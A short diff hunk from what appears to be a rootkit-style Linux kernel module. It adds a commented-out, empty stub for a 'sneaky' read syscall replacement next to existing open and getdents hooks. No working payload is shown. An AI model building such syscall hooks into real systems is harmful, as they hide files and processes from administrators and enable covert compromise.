@@ -85,6 +85,19 @@ asmlinkage int sneaky_sys_open(const char *pathname, int flags)
 
 }
 
+/*
+//READ FUNCTIONS
+asmlinkage int (*original_read)(int fd, void *buf, size_t count);
+
+//Define our new sneaky version of the 'open' syscall
+asmlinkage int sneaky_sys_read(int fd, void *buf, size_t count)
+{
+
+
+}
+
+*/
+
 
 
 //GETDENTS FUNCTIONS
